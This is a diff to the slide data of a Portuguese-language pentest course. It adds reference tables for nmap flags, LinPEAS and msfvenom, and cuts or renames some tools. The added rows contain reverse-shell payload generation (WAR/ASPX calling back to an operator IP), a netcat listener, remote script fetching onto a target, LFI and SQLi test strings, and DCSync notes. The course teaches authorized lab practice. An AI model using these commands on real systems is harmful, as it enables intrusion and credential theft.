@@ -241,11 +241,11 @@ const intensiveSlides: Slide[] = [
         rows: [
           ['O host está acessível?', 'ping, nmap -sn, nmap -Pn', 'Teste ICMP e, se bloqueado, force scan sem ping com -Pn.', 'Sem resposta ICMP não significa host offline.', 'Rodar scan TCP nas portas mais comuns.'],
           ['Quais portas estão abertas?', 'nmap', 'Comece com -sC -sV e depois -p- para todas as portas TCP.', 'STATE open indica serviço aceitando conexão.', 'Enumerar cada serviço aberto por protocolo.'],
-          ['Qual tecnologia web roda ali?', 'curl, whatweb, navegador', 'Leia headers, título, cookies, redirects e HTML.', 'Server, X-Powered-By e cookies sugerem stack.', 'Buscar rotas, versões e painéis.'],
+          ['Qual tecnologia web roda ali?', 'curl, navegador, código-fonte', 'Leia headers, título, cookies, redirects e HTML.', 'Server, X-Powered-By e cookies sugerem stack.', 'Buscar rotas, versões e painéis.'],
           ['Existe conteúdo escondido?', 'gobuster, ffuf, feroxbuster', 'Fuzzing de diretórios, arquivos, extensões e vhosts.', '200, 301, 302, 401 e 403 merecem inspeção.', 'Abrir manualmente e testar parâmetros.'],
           ['Há arquivos expostos?', 'ftp, smbclient, enum4linux', 'Teste anonymous/null session antes de credenciais.', 'Shares legíveis e arquivos de backup são evidência forte.', 'Baixar, classificar e buscar segredos.'],
           ['O tráfego revela credenciais?', 'Wireshark, tshark', 'Filtre por ftp, http, telnet, smtp e Follow TCP Stream.', 'USER/PASS, Authorization Basic e cookies aparecem em claro.', 'Validar credenciais em serviços permitidos do lab.'],
-          ['Depois do shell, como escalar?', 'linpeas manual, sudo -l, find, getcap', 'Comece pelos comandos nativos antes de scripts automáticos.', 'SUID incomum, NOPASSWD e capability são vetores.', 'Consultar GTFOBins e testar com cuidado.'],
+          ['Depois do shell, como escalar?', 'sudo -l, find, getcap, cron, grep por segredos, linpeas', 'Comece pelos comandos nativos; depois rode linpeas para ampliar cobertura e confirmar hipóteses.', 'SUID incomum, NOPASSWD, capability, cron, arquivos sensíveis e achados destacados pelo linpeas são vetores.', 'Não copie output colorido: valide manualmente cada achado.'],
         ],
       },
       tips: [
@@ -262,15 +262,16 @@ const intensiveSlides: Slide[] = [
         headers: ['Ferramenta', 'Use quando', 'Comando base', 'O que observar', 'Evite quando'],
         rows: [
           ['nmap', 'Precisa descobrir portas, serviços, versões e scripts seguros.', 'nmap -sC -sV -oN scan.txt <IP>', 'Porta, serviço, versão, scripts, redirects e nomes de host.', 'Você já sabe a porta exata e quer uma requisição manual simples.'],
-          ['masscan', 'Precisa varrer muitas portas ou muitos hosts rapidamente em lab controlado.', 'masscan <IP> -p1-65535 --rate 10000', 'Portas abertas para confirmar depois com nmap.', 'Rede real, escopo pequeno ou ambiente sensível.'],
           ['curl', 'Precisa ver headers, corpo, cookies, POST, redirects e APIs sem navegador.', 'curl -i -L http://<host>/', 'Status code, Set-Cookie, Location, Server e diferenças de resposta.', 'Precisa interagir com JavaScript complexo.'],
           ['gobuster', 'Quer enumeração simples de diretórios, arquivos, DNS ou vhosts.', 'gobuster dir -u http://<host>/ -w wordlist.txt', 'Códigos 200/301/302/401/403 e tamanho da resposta.', 'O alvo filtra por tamanho ou tem muitos falsos positivos.'],
           ['ffuf', 'Precisa fuzzing flexível em caminho, parâmetro, header ou vhost.', 'ffuf -u http://<host>/FUZZ -w wordlist.txt', 'Filtrar por status, tamanho, palavras e linhas.', 'Você ainda não entendeu a aplicação manualmente.'],
           ['smbclient', 'Precisa listar shares SMB e baixar arquivos.', 'smbclient -L //<IP> -N', 'Shares legíveis, permissões de leitura/escrita e arquivos sensíveis.', 'Quer enumeração ampla de usuários e políticas.'],
           ['enum4linux-ng', 'Precisa panorama SMB/RPC em Windows ou Samba.', 'enum4linux-ng -A <IP>', 'Usuários, grupos, shares, domínio e política de senha.', 'Tem credenciais válidas e precisa de ações específicas.'],
           ['netcat', 'Precisa testar banner, listener ou shell em laboratório.', 'nc -nv <IP> <porta>', 'Banner, resposta bruta e conectividade.', 'Protocolo exige TLS, autenticação complexa ou cliente específico.'],
+          ['msfvenom', 'Lab confirmou que o serviço aceita artefato executável/deployável.', 'msfvenom -p <payload> LHOST=<IP> LPORT=<porta> -f <formato> -o arquivo', 'Gera arquivo para uso controlado no lab, como WAR ou ASPX.', 'Não use antes de provar o vetor e preparar listener.'],
           ['Wireshark', 'Precisa entender tráfego visualmente.', 'Abrir pcap -> Follow TCP Stream', 'Credenciais, arquivos, sequência TCP, DNS e HTTP.', 'Quer processar muitos PCAPs em lote. Use tshark.'],
           ['tshark', 'Precisa extrair dados de PCAP por terminal.', 'tshark -r captura.pcap -Y http', 'Campos filtrados, contagens e exportação para texto.', 'Ainda está aprendendo o fluxo visual do pacote.'],
+          ['linpeas', 'Já tem shell Linux e fez enumeração manual básica.', './linpeas.sh | tee linpeas.txt', 'Destaca permissões, SUID, capabilities, cron, credenciais e configs suspeitas.', 'Nunca substitui sudo -l, find, getcap e validação manual.'],
         ]
       }
     }
@@ -784,7 +785,7 @@ const intensiveSlides: Slide[] = [
       table: {
         headers: ['Técnica', 'Pré-requisito', 'Ferramenta comum', 'Evidência de que faz sentido'],
         rows: [
-          ['ForceChangePassword', 'Aresta no BloodHound sobre uma conta.', 'net rpc password, bloodyAD.', 'BloodHound mostra ForceChangePassword do usuário atual.'],
+          ['ForceChangePassword', 'Aresta no BloodHound sobre uma conta.', 'net rpc password.', 'BloodHound mostra ForceChangePassword do usuário atual.'],
           ['DCSync', 'Replicating Directory Changes ou equivalente.', 'secretsdump.py.', 'BloodHound mostra CanDCSync ou WriteDACL explorável.'],
           ['SeBackupPrivilege', 'Token com privilégio de backup.', 'diskshadow, robocopy /b, secretsdump offline.', 'whoami /priv mostra SeBackupPrivilege enabled/available.'],
           ['Kerberoasting', 'Credencial válida e conta com SPN.', 'GetUserSPNs.py, hashcat.', 'LDAP revela servicePrincipalName.'],
@@ -904,7 +905,7 @@ const intensiveSlides: Slide[] = [
         headers: ['Área', 'Pergunta central', 'Ferramentas', 'Evidência produzida'],
         rows: [
           ['Redes', 'Que portas e protocolos existem?', 'nmap, Wireshark, tcpdump, tshark.', 'Portas, serviços, conversas, pacotes.'],
-          ['Web', 'Como a aplicação recebe e responde dados?', 'curl, navegador, Burp, ffuf, gobuster.', 'Headers, rotas, parâmetros, status codes.'],
+          ['Web', 'Como a aplicação recebe e responde dados?', 'curl, navegador, ffuf, gobuster.', 'Headers, rotas, parâmetros, status codes.'],
           ['Linux', 'Que permissões e configurações viram privilégio?', 'sudo, find, getcap, ps, ss, journalctl.', 'SUID, capabilities, cron, logs, processos.'],
           ['Windows', 'Quem autenticou e que processo executou?', 'Event Viewer, PowerShell, Sysmon, whoami.', 'Event IDs, tokens, serviços, command line.'],
           ['Active Directory', 'Quais identidades e relações criam caminho de ataque?', 'rpcclient, ldapsearch, Impacket, BloodHound.', 'Usuários, grupos, SPNs, arestas e tickets.'],
@@ -1008,7 +1009,7 @@ const expandedTheorySlides: Slide[] = [
           ['Active', 'SMB anonymous, SYSVOL, Group Policy Preferences, cpassword, Kerberoasting.', 'smbclient, gpp-decrypt, GetUserSPNs.py, hashcat, psexec em lab.', 'Por que Groups.xml é sensível e como Kerberoasting depende de conta com SPN.'],
           ['Monteverde', 'RPC enumeration, password spray controlado, Azure AD Connect, credenciais em banco/config.', 'rpcclient, crackmapexec, smbclient, ferramentas MSSQL/PowerShell.', 'Por que spray é diferente de brute force e por que política de lockout precisa ser checada.'],
           ['Cascade', 'LDAP attributes, dados legados, AD Recycle Bin, VNC password decrypt.', 'ldapsearch, ldapdomaindump, smbclient, ferramentas de decrypt em lab.', 'Por que atributos LDAP incomuns podem conter dados sensíveis e como objetos deletados ainda podem revelar informação.'],
-          ['Cronos', 'DNS zone transfer, subdomínio admin, SQL injection auth bypass, cron job gravável.', 'dig, /etc/hosts, curl/Burp, sqlmap/manual em lab, cat /etc/crontab.', 'Como AXFR revela superfície oculta e por que cron executando script gravável vira root.'],
+          ['Cronos', 'DNS zone transfer, subdomínio admin, SQL injection auth bypass, cron job gravável.', 'dig, /etc/hosts, curl/navegador, teste manual de SQLi em lab, cat /etc/crontab.', 'Como AXFR revela superfície oculta e por que cron executando script gravável vira root.'],
         ]
       }
     }
@@ -1038,7 +1039,7 @@ const expandedTheorySlides: Slide[] = [
           ['Querier', 'SMB com arquivo Office, string de conexão MSSQL, xp_cmdshell, captura NetNTLM, Silver Ticket conceitual.', 'smbclient, strings/oletools, mssqlclient.py, responder em lab.', 'Como credenciais em documento levam ao MSSQL e por que serviço SQL pode executar comandos quando mal configurado.'],
           ['Mantis', 'Aplicação .NET, credenciais protegidas/configuradas, MSSQL, Kerberos Bronze Bit conceitual.', 'curl/navegador, ferramentas .NET em lab, mssqlclient.py, enumeração AD.', 'Por que arquivos/configs de aplicação podem esconder credenciais e como banco vira ponte para domínio.'],
           ['Reel2', 'OWA, phishing em lab controlado, captura NTLMv2, JEA PowerShell, Sticky Notes como fonte de credenciais.', 'navegador, responder em lab, PowerShell, leitura de artefatos de usuário.', 'Por que phishing só é tratado em ambiente controlado e como JEA restringe comandos mas pode ter bypass específico.'],
-          ['Multimaster', 'SQLi com WAF, Unicode bypass conceitual, Sysmon, túnel VS Code, Exchange abuse conceitual.', 'Burp/curl, leitura Sysmon, ferramentas de pivot em lab, BloodHound.', 'Como WAF muda input mas não elimina bug lógico e por que telemetria ajuda a entender pivot.'],
+          ['Multimaster', 'SQLi com WAF, Unicode bypass conceitual, Sysmon, túnel VS Code, Exchange abuse conceitual.', 'curl/navegador, leitura Sysmon, ferramentas de pivot em lab, BloodHound.', 'Como WAF muda input mas não elimina bug lógico e por que telemetria ajuda a entender pivot.'],
         ]
       }
     }
@@ -1115,7 +1116,7 @@ const tenHourWorkshopSlides: Slide[] = [
     type: 'theory',
     content: {
       theory: [
-        'O objetivo deste drill é fazer o aluno reconhecer padrões locais sem depender imediatamente de scripts automáticos. Scripts como linpeas são úteis, mas se o aluno não entende sudo, SUID, capabilities, cron e permissões, ele só copia output colorido sem raciocínio.',
+        'O objetivo deste drill é fazer o aluno reconhecer padrões locais com comandos nativos antes de qualquer automação. LinPEAS entra depois do checklist manual: ele acelera cobertura, mas o aluno ainda precisa explicar sudo, SUID, capabilities, cron e permissões.',
         'Comece com identidade. whoami responde o nome do usuário; id responde UID, GID e grupos. Grupos como adm, docker, lxd, backup e sudo mudam completamente o caminho. Um aluno deve olhar para grupos como quem olha para portas abertas: cada grupo é uma superfície de privilégio.',
         'Depois vem sudo -l. Uma regra NOPASSWD deve acender alerta: se o usuário pode executar um binário como root, o próximo passo é entender se aquele binário permite shell, leitura, escrita, execução de comando ou escape. GTFOBins é uma referência para isso, mas a pergunta vem antes: o binário tem função que quebra a fronteira de privilégio?',
         'SUID e capabilities são duas formas de delegar poder. SUID executa com o dono do arquivo; capability entrega permissões específicas para um binário. A Cap usa cap_setuid+ep em Python: isso significa que o interpretador pode chamar setuid e assumir UID 0. O aluno precisa entender esse porquê antes de ver a linha final que vira root.',
@@ -1130,6 +1131,7 @@ const tenHourWorkshopSlides: Slide[] = [
           ['Capabilities', 'Há permissão granular perigosa?', 'getcap mostra cap_setuid, cap_dac_read_search ou similar.', '35 min'],
           ['Cron', 'Root executa algo que eu controlo?', 'crontab chama script gravável.', '35 min'],
           ['Segredos', 'Configuração guarda credenciais?', 'grep encontra senha em /var/www, /opt ou backup.', '30 min'],
+          ['LinPEAS', 'O checklist manual deixou passar algo?', 'linpeas.txt destaca achados; aluno valida com comando nativo.', '35 min'],
         ]
       }
     }
@@ -1302,11 +1304,35 @@ const tenHourWorkshopSlides: Slide[] = [
 const commandManualSlides: Slide[] = [
   // ==================== MANUAL DE COMANDOS - DIA 1 ====================
   {
+    id: 'd1-tool-coverage-contract', title: 'Contrato de Ferramentas — Nada Sem Explicação', day: 1, topic: 'Ferramentas',
+    type: 'table',
+    content: {
+      theory: [
+        'Regra do curso: se uma ferramenta aparece em aula, lab, roteiro ou resolução, ela precisa ter pergunta, comando base, partes importantes, saída esperada, cuidado e relação com o lab.',
+        'Ferramentas grandes não cabem literalmente inteiras em uma página. Para elas, o curso cobre todas as opções usadas/citadas e ensina como abrir a referência completa da versão instalada.',
+      ],
+      table: {
+        headers: ['Ferramenta / grupo', 'Onde é ensinada', 'Como saber que foi aprendida'],
+        rows: [
+          ['Nmap', 'Manual Nmap + Flags por Categoria + terminal realista.', 'Aluno explica -sC, -sV, -p, -p-, -Pn, scripts, saída e decisão.'],
+          ['curl, gobuster, ffuf, feroxbuster', 'Manual HTTP/curl e Manual Web Fuzzing.', 'Aluno diferencia enumeração manual, fuzzing, filtro e falso positivo.'],
+          ['FTP, SMB, SSH, netcat', 'Manual de Serviços de Rede.', 'Aluno lista acesso anônimo, credencial, share, listener e evidência.'],
+          ['Linux nativo', 'Manual Linux Essencial + Drill de Escalada Local.', 'Aluno valida sudo, SUID, capabilities, cron e segredos sem automação.'],
+          ['LinPEAS', 'Manual LinPEAS em Lab Autorizado.', 'Aluno roda depois do checklist manual e valida cada achado com comando nativo.'],
+          ['msfvenom', 'Manual msfvenom em Labs.', 'Aluno sabe gerar artefato só quando o serviço/lab permite e com listener correto.'],
+          ['Wireshark/tshark', 'Manual PCAP/Forense e filtros essenciais.', 'Aluno extrai credenciais/fluxos e documenta evidência.'],
+          ['Impacket, BloodHound, hashcat', 'Manuais de Active Directory, BloodHound e Hashcat.', 'Aluno explica pré-requisito, hash gerado, modo e validação.'],
+        ]
+      }
+    }
+  },
+  {
     id: 'd1-manual-nmap', title: 'Manual de Comandos — Nmap', day: 1, topic: 'Ferramentas',
     type: 'table',
     content: {
       theory: [
         'Nmap deve ser usado em camadas: descobrir se o host responde, descobrir portas, identificar serviços, aprofundar scripts e validar achados. Cada comando abaixo tem uma intenção diferente.',
+        'O Nmap tem muitas opções e scripts NSE que variam por versão. Para totalidade da sua instalação, use nmap --help, man nmap e nmap --script-help all. No curso, toda opção usada nos labs aparece explicada abaixo ou na referência por categoria.',
       ],
       table: {
         headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
@@ -1326,6 +1352,53 @@ const commandManualSlides: Slide[] = [
           ['nmap --script=smb-enum-shares,smb-enum-users -p445 <IP>', 'SMB aberto.', 'Lista shares/usuários quando permitido.', 'Pode revelar nomes de share e contas.', 'Falha não significa que SMB não tem dados.'],
           ['nmap --script=vuln -p <porta> <IP>', 'Após identificar serviço e versão.', 'Procura checks conhecidos de vulnerabilidade.', 'Saída sugere CVEs ou misconfigs.', 'Confirme manualmente; script pode ter falso positivo.'],
           ['nmap -oA scans/initial <IP>', 'Quando quer evidência completa.', 'Salva normal, grepable e XML.', 'Gera initial.nmap, initial.gnmap e initial.xml.', 'Organize nomes para não sobrescrever.'],
+        ]
+      }
+    }
+  },
+  {
+    id: 'd1-manual-nmap-flags', title: 'Manual de Comandos — Nmap Flags por Categoria', day: 1, topic: 'Ferramentas',
+    type: 'table',
+    content: {
+      theory: [
+        'Esta página não é para decorar. É para o aluno saber onde cada opção entra no raciocínio: escopo, descoberta, portas, serviço, scripts, saída, velocidade e leitura.',
+      ],
+      table: {
+        headers: ['Opção / comando', 'Categoria', 'O que faz', 'Quando usar', 'Cuidado'],
+        rows: [
+          ['nmap --help', 'Referência', 'Mostra ajuda resumida da versão instalada.', 'Quando surgir flag nova ou dúvida de sintaxe.', 'A ajuda curta não substitui man nmap.'],
+          ['man nmap', 'Referência', 'Abre o manual completo instalado localmente.', 'Para consultar todas as opções da versão do aluno.', 'Pode ser longo; pesquise com /termo.'],
+          ['nmap --script-help all', 'Referência NSE', 'Lista ajuda dos scripts NSE disponíveis.', 'Quando precisar saber o que um script faz antes de rodar.', 'Scripts podem ser intrusivos; leia categoria e descrição.'],
+          ['-sn', 'Descoberta de host', 'Ping scan: descobre hosts sem varrer portas.', 'Inventário inicial em rede autorizada.', 'ICMP bloqueado pode esconder hosts.'],
+          ['-Pn', 'Descoberta de host', 'Assume host ativo e pula ping discovery.', 'Quando o alvo parece down, mas você sabe que existe.', 'Mais lento em múltiplos hosts.'],
+          ['-p 22,80,445', 'Portas', 'Escaneia portas específicas.', 'Depois de descobrir portas ou quando há hipótese clara.', 'Porta fora da lista fica invisível.'],
+          ['-p-', 'Portas', 'Escaneia todas as portas TCP.', 'Depois do scan inicial.', 'Mais demorado; salve saída.'],
+          ['--top-ports 100', 'Portas', 'Escaneia as portas mais comuns.', 'Triagem rápida em lab.', 'Pode perder serviço fora do comum.'],
+          ['-F', 'Portas', 'Fast scan com menos portas.', 'Quando precisa de visão muito rápida.', 'Cobertura menor.'],
+          ['-sS', 'Tipo de scan', 'SYN scan; rápido e comum quando há privilégio.', 'Linux com sudo/root.', 'Requer privilégio e pode aparecer em logs.'],
+          ['-sT', 'Tipo de scan', 'TCP connect scan completo.', 'Quando não há privilégio para -sS.', 'Mais ruidoso.'],
+          ['-sU', 'Tipo de scan', 'Scan UDP.', 'Quando suspeita DNS, SNMP, NTP, TFTP.', 'Lento e open|filtered é ambíguo.'],
+          ['-sV', 'Serviço', 'Detecta nome e versão do serviço.', 'Quase sempre após achar porta aberta.', 'Pode demorar em serviços estranhos.'],
+          ['--version-all', 'Serviço', 'Aumenta intensidade da detecção de versão.', 'Quando versão é decisiva e -sV foi inconclusivo.', 'Mais probes e mais tempo.'],
+          ['-O', 'Sistema operacional', 'Tenta fingerprint do OS.', 'Quando OS muda a hipótese de exploração/defesa.', 'Pode errar com firewall/NAT.'],
+          ['-A', 'Agressivo', 'Combina OS, versão, scripts padrão e traceroute.', 'Lab controlado para visão rápida.', 'Não use como primeiro comando em ambiente sensível.'],
+          ['-sC', 'Scripts NSE', 'Roda scripts padrão, equivalente a --script=default.', 'Primeiro aprofundamento de CTF.', 'Leia saída; script falho não prova ausência de falha.'],
+          ['--script=<nome>', 'Scripts NSE', 'Executa script específico.', 'Quando há hipótese por serviço.', 'Verifique se é safe/default/vuln/intrusive.'],
+          ['--script=http-enum', 'Scripts HTTP', 'Procura caminhos HTTP comuns.', 'Porta web aberta.', 'Não substitui fuzzing dedicado.'],
+          ['--script=ftp-anon', 'Scripts FTP', 'Testa login anonymous.', 'Porta 21 aberta.', 'Se der positivo, valide manualmente.'],
+          ['--script=smb-enum-shares,smb-enum-users', 'Scripts SMB', 'Tenta listar shares e usuários.', 'SMB aberto em lab.', 'Falha pode ser permissão, não ausência de SMB.'],
+          ['--script=vuln', 'Scripts vuln', 'Roda checks de vulnerabilidade disponíveis.', 'Após versão/serviço claros.', 'Pode ter falso positivo e scripts intrusivos.'],
+          ['--reason', 'Leitura', 'Mostra por que o Nmap marcou estado da porta.', 'Para explicar open/closed/filtered no relatório.', 'Exige entender resposta TCP/ICMP.'],
+          ['--open', 'Leitura', 'Mostra só portas abertas/provavelmente abertas.', 'Quando a saída está grande.', 'Pode esconder contexto de filtered.'],
+          ['-v / -vv', 'Leitura', 'Aumenta verbosidade.', 'Quando scan demora e você quer progresso.', 'Saída maior.'],
+          ['-oN scan.txt', 'Saída', 'Salva saída normal.', 'Relatório e revisão.', 'Não sobrescreva sem querer.'],
+          ['-oA scans/inicial', 'Saída', 'Salva normal, grepable e XML.', 'Quando quer evidência completa.', 'Crie pasta antes.'],
+          ['-oX scan.xml', 'Saída', 'Salva XML.', 'Importar em ferramentas ou parsear.', 'Menos confortável para leitura humana.'],
+          ['-iL alvos.txt', 'Escopo', 'Lê lista de alvos de arquivo.', 'Múltiplos IPs autorizados.', 'Arquivo errado muda escopo.'],
+          ['--exclude <IP>', 'Escopo', 'Remove alvo do scan.', 'Quando uma faixa contém host fora do escopo.', 'Confira antes de rodar.'],
+          ['-T0 a -T5', 'Performance', 'Define timing template.', 'Lab pode usar T4; ambiente sensível exige cautela.', 'Mais rápido pode gerar perda/ruído.'],
+          ['--min-rate 5000', 'Performance', 'Define taxa mínima de pacotes.', 'CTF/lab para varrer todas as portas.', 'Pode perder resultado se rede não aguentar.'],
+          ['--max-retries <n>', 'Performance', 'Limita tentativas por probe.', 'Ajuste fino em lab com perda baixa.', 'Baixo demais perde portas.'],
         ]
       }
     }
@@ -1433,6 +1506,58 @@ const commandManualSlides: Slide[] = [
           ['tail -f /var/log/auth.log', 'Monitorar autenticação.', 'Vê SSH/sudo em tempo real.', 'Falhas e logins aparecem com IP/usuário.', 'Nem toda distro usa auth.log.'],
           ['journalctl -u ssh --since "1 hour ago"', 'Distro com systemd.', 'Filtra logs de serviço.', 'Mostra eventos recentes do SSH.', 'Permissões podem limitar leitura.'],
           ['tar -czf coleta.tgz pasta/', 'Coletar evidências em lab.', 'Compacta arquivos para análise.', 'Gera pacote .tgz.', 'Não compacte dados sensíveis fora do escopo.'],
+        ]
+      }
+    }
+  },
+  {
+    id: 'd1-manual-linpeas', title: 'Manual de Comandos — LinPEAS em Lab Autorizado', day: 1, topic: 'Linux',
+    type: 'table',
+    content: {
+      theory: [
+        'LinPEAS é automação de enumeração local. Ele não "escala privilégio"; ele aponta evidências que o aluno precisa validar com comandos nativos.',
+        'Ordem obrigatória no curso: primeiro whoami/id, sudo -l, SUID, capabilities, cron e segredos; depois linpeas para cobertura e comparação.',
+      ],
+      table: {
+        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
+        rows: [
+          ['curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh', 'Na máquina do operador, antes do lab.', 'Baixa o script oficial para servir ao alvo.', 'Cria linpeas.sh no diretório atual.', 'Baixe apenas fonte confiável e confira o escopo do lab.'],
+          ['sha256sum linpeas.sh', 'Depois de baixar.', 'Registra hash do script usado no relatório.', 'Gera hash SHA256 para rastreabilidade.', 'Hash muda quando a versão muda.'],
+          ['python3 -m http.server 8000', 'Na máquina do operador.', 'Serve o arquivo para o alvo baixar.', 'Abre servidor HTTP local na porta 8000.', 'Use apenas em rede de lab/VPN autorizada.'],
+          ['wget http://<SEU_IP>:8000/linpeas.sh -O /tmp/linpeas.sh', 'No alvo Linux com wget.', 'Transfere o script para /tmp.', 'Arquivo aparece em /tmp/linpeas.sh.', 'Se wget não existir, use curl.'],
+          ['curl http://<SEU_IP>:8000/linpeas.sh -o /tmp/linpeas.sh', 'No alvo Linux sem wget.', 'Alternativa para transferir o script.', 'Arquivo aparece em /tmp/linpeas.sh.', 'Confirme que <SEU_IP> é seu IP da VPN/lab.'],
+          ['chmod +x /tmp/linpeas.sh', 'Depois do download.', 'Permite executar o script.', 'Adiciona bit de execução.', 'Permissão de execução não significa privilégio.'],
+          ['/tmp/linpeas.sh | tee /tmp/linpeas.txt', 'Após checklist manual.', 'Executa e salva a saída para revisão.', 'Mostra achados e grava linpeas.txt.', 'Não cole tudo no relatório; selecione evidências.'],
+          ['less -R /tmp/linpeas.txt', 'Ler saída salva com cores.', 'Facilita revisar seções grandes.', 'Permite navegar e buscar por termos.', 'A saída é pista, não conclusão.'],
+          ['grep -Ei "sudo|suid|capabilities|password|writable|cron" /tmp/linpeas.txt', 'Revisão focada.', 'Extrai áreas que conectam aos vetores ensinados.', 'Mostra linhas relevantes para validar manualmente.', 'grep pode perder contexto; volte ao arquivo completo.'],
+          ['sudo -l', 'Validar achado de sudo.', 'Confirma permissão indicada pelo linpeas.', 'Mostra comandos permitidos como outro usuário/root.', 'Pode exigir senha.'],
+          ['find / -perm -4000 -type f 2>/dev/null', 'Validar achado de SUID.', 'Confirma binários SUID destacados.', 'Lista binários com bit SUID.', 'Compare com padrão da distro.'],
+          ['getcap -r / 2>/dev/null', 'Validar achado de capability.', 'Confirma capabilities perigosas.', 'Mostra cap_setuid, cap_dac_read_search etc.', 'Nem toda capability vira root.'],
+          ['cat /etc/crontab; ls -la /etc/cron.*', 'Validar achado de cron.', 'Confirma tarefa e permissões.', 'Mostra frequência, usuário e script chamado.', 'Não edite sem entender timing.'],
+          ['rm -f /tmp/linpeas.sh /tmp/linpeas.txt', 'Fim do lab.', 'Remove artefatos temporários.', 'Limpa arquivos criados no alvo.', 'Guarde evidências necessárias antes.'],
+        ]
+      },
+      tips: [
+        'Leitura das cores: destaque forte pede validação, não ação automática.',
+        'Relatório bom escreve: linpeas apontou X, validei com comando Y, a evidência foi Z, então a decisão foi W.',
+      ]
+    }
+  },
+  {
+    id: 'd1-manual-msfvenom', title: 'Manual de Comandos — msfvenom em Labs', day: 1, topic: 'Ferramentas',
+    type: 'table',
+    content: {
+      theory: [
+        'msfvenom aparece no curso apenas para gerar artefatos em laboratório autorizado, como WAR para Tomcat ou ASPX para IIS. Ele não substitui enumeração nem validação.',
+      ],
+      table: {
+        headers: ['Comando', 'Quando usar', 'Por que usar', 'O que acontece / como ler', 'Cuidado'],
+        rows: [
+          ['msfvenom -l payloads | grep -i jsp', 'Antes de gerar payload Java/JSP.', 'Lista payloads disponíveis e filtra por JSP.', 'Mostra nomes de payload aceitos pelo -p.', 'Escolha payload compatível com o serviço.'],
+          ['msfvenom -p java/jsp_shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f war -o shell.war', 'Tomcat Manager com deploy WAR autorizado no lab.', 'Gera WAR com JSP de reverse shell.', 'Cria shell.war para upload no Manager.', 'Use só em lab; confirme LHOST e listener.'],
+          ['msfvenom -p windows/shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f aspx -o shell.aspx', 'IIS executando ASPX em lab.', 'Gera webshell/reverse shell ASPX.', 'Cria shell.aspx para upload em pasta servida.', 'Só funciona se IIS executar ASPX e o upload for permitido.'],
+          ['file shell.war; ls -lh shell.war', 'Depois de gerar arquivo.', 'Confirma que o artefato existe e tem tamanho plausível.', 'Mostra tipo/tamanho.', 'Não execute localmente.'],
+          ['nc -lvnp 4444', 'Antes de acionar payload reverso.', 'Abre listener para receber conexão.', 'Quando o alvo conectar, aparece sessão.', 'Porta deve bater com LPORT.'],
         ]
       }
     }
@@ -2054,7 +2179,7 @@ const baseSlides: Slide[] = [
         'ffuf -u http://target.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt',
         'curl "http://target.htb/page?id=1\'"     # teste básico de SQLi',
         "curl 'http://target.htb/page?file=../../../../etc/passwd'   # LFI",
-        'sqlmap -u "http://target.htb/?id=1" --dbs   # automatizar SQLi (lab apenas)',
+        'curl "http://target.htb/page?id=1 or 1=1" # comparar resposta no lab',
       ]
     }
   },
@@ -2389,7 +2514,7 @@ const baseSlides: Slide[] = [
           ['LSASS memory access', 'T1003.001 — OS Credential Dumping: LSASS'],
           ['Regsvr32 executando DLL', 'T1218.010 — Regsvr32'],
           ['PowerShell encoded command', 'T1059.001 — PowerShell'],
-          ['nmap / masscan', 'T1046 — Network Service Discovery'],
+          ['nmap', 'T1046 — Network Service Discovery'],
           ['Chave Run no Registry', 'T1547.001 — Registry Run Keys'],
         ]
       }
@@ -2571,7 +2696,7 @@ const baseSlides: Slide[] = [
         'Reportar técnica MITRE errada — leia a descrição completa, não chute pelo nome',
         'Não documentar durante a prova — se não escreveu, não aconteceu',
         'Assumir que SMBv1 = EternalBlue sem verificar o patch level',
-        'Usar ferramentas pesadas (sqlmap, metasploit) antes da enumeração manual básica',
+        'Usar automação pesada antes da enumeração manual básica',
       ]
     }
   },
